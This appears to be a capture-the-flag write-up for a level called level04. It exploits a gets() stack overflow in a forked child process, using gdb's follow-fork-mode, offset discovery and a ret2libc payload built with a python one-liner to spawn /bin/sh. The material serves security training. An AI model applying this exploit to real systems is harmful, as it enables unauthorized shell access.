In this level, the program uses fork to create a child process and consists of 2 conditions, the first is executed by the child process and the second by the parent. the second condition has nothing interesting but in the first condition we have:

0x0804874b <+131>:	mov    DWORD PTR [esp],0x8048903 // "Give me some shellcode, k"
0x08048752 <+138>:	call   0x8048500 <puts@plt>
0x08048757 <+143>:	lea    eax,[esp+0x20]
0x0804875b <+147>:	mov    DWORD PTR [esp],eax
0x0804875e <+150>:	call   0x80484b0 <gets@plt> // we have here a buffer overflow candidate.

If we try testing and debugging with gdb, we won't get far since it doesn't follow the child process unless we set it with the command :

set follow-fork-mode child

now we can go through the first condition and see where the return address is overwritten by our payload:
our simple payload will be to test the buffer: 
aaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzzAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ


now when we follow the child process we see a segfault:

Program received signal SIGSEGV, Segmentation fault.
[Switching to process 2305]
0x4e4e4e4e in ?? () // 0x4e = 'N'

now a simple ret2libc is enough to open the shell,

p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
find 0xf7e2c000,0xf7fcc000, "/bin/sh"
0xf7f897ec

that means our final payload will be:
python -c 'print("aaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzzAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMM"+"\xd0\xae\xe6\xf7"+"0000"+"\xec\x97\xf8\xf7")' > payload
cat payload - | ./level04